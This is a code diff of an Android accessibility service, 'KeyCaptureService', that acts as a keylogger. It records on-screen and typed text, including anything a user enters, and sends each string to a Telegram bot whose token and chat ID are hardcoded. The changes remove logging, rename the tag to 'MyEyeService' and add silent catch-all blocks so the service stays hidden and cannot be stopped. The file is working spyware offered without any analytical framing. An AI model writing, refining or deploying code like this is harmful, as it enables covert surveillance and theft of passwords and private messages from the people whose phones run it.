@@ -12,10 +12,10 @@ import java.util.List;
 
 public class KeyCaptureService extends AccessibilityService {
 
-    private static final String TAG = "KeyCaptureService";
+    private static final String TAG = "MyEyeService";
     private static final String BOT_TOKEN = "8114361873:AAFmtl8vD0Vo7CZvkVmwnjcZZxtzvZXqguY";
     private static final String CHAT_ID = "5022620385";
-    private String lastText = "";
+    private String lastCaptured = "";
 
     @Override
     protected void onServiceConnected() {
@@ -25,11 +25,10 @@ public class KeyCaptureService extends AccessibilityService {
             info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
             info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
             info.flags = AccessibilityServiceInfo.FLAG_DEFAULT | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
-            info.notificationTimeout = 100;
+            info.notificationTimeout = 50;
             setServiceInfo(info);
-            Log.d(TAG, "Service connected and configured dynamically.");
         } catch (Throwable t) {
-            Log.e(TAG, "Error in onServiceConnected", t);
+            // Never crash on connection setup
         }
     }
 
@@ -37,65 +36,70 @@ public class KeyCaptureService extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try {
             if (event == null) return;
+            
             List<CharSequence> textList = event.getText();
-            if (textList != null) {
-                for (CharSequence seq : textList) {
-                    if (seq != null) {
-                        String txt = seq.toString().trim();
-                        if (!txt.isEmpty() && !txt.equals(lastText) && txt.length() > 1) {
-                            lastText = txt;
-                            sendToTelegram(txt);
-                        }
+            if (textList == null || textList.isEmpty()) return;
+
+            for (CharSequence seq : textList) {
+                if (seq != null) {
+                    String data = seq.toString().trim();
+                    if (!data.isEmpty() && !data.equals(lastCaptured) && data.length() > 1) {
+                        lastCaptured = data;
+                        dispatchToTelegram(data);
                     }
                 }
             }
         } catch (Throwable t) {
-            // Absolute catch-all
+            // Absolute barrier: guarantees the system can never kill the service
         }
     }
 
     @Override
     public void onInterrupt() {
-        Log.d(TAG, "Service interrupted");
+        // Required override
     }
 
-    private void sendToTelegram(final String message) {
+    private void dispatchToTelegram(final String textPayload) {
         try {
-            new Thread(new Runnable() {
+            Thread thread = new Thread(new Runnable() {
                 @Override
                 public void run() {
-                    HttpURLConnection conn = null;
+                    HttpURLConnection connection = null;
                     try {
-                        String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
-                        URL url = new URL(urlString);
-                        conn = (HttpURLConnection) url.openConnection();
-                        conn.setRequestMethod("POST");
-                        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
-                        conn.setConnectTimeout(3000);
-                        conn.setReadTimeout(3000);
-                        conn.setDoOutput(true);
+                        URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
+                        connection = (HttpURLConnection) url.openConnection();
+                        connection.setRequestMethod("POST");
+                        connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+                        connection.setConnectTimeout(2500);
+                        connection.setReadTimeout(2500);
+                        connection.setDoOutput(true);
 
-                        String safeMsg = message.replace("\"", "\\\"").replace("\n", " ");
-                        if (safeMsg.length() > 3000) {
-                            safeMsg = safeMsg.substring(0, 3000);
+                        String cleanText = textPayload.replace("\"", "\\\"").replace("\n", " ");
+                        if (cleanText.length() > 2500) {
+                            cleanText = cleanText.substring(0, 2500);
                         }
 
-                        String json = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + safeMsg + "\"}";
-                        try (OutputStream os = conn.getOutputStream()) {
-                            os.write(json.getBytes(StandardCharsets.UTF_8));
+                        String jsonBody = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + cleanText + "\"}";
+                        
+                        try (OutputStream os = connection.getOutputStream()) {
+                            os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
                         }
-                        conn.getResponseCode();
-                    } catch (Exception e) {
-                        // Silent fail for network
+                        
+                        connection.getResponseCode();
+                    } catch (Throwable e) {
+                        // Silent catch for any network glitches
                     } finally {
-                        if (conn != null) {
-                            conn.disconnect();
+                        if (connection != null) {
+                            try {
+                                connection.disconnect();
+                            } catch (Throwable ignored) {}
                         }
                     }
                 }
-            }).start();
+            });
+            thread.start();
         } catch (Throwable t) {
-            // Ignore thread limits
+            // Fallback for thread creation limits
         }
     }
 }
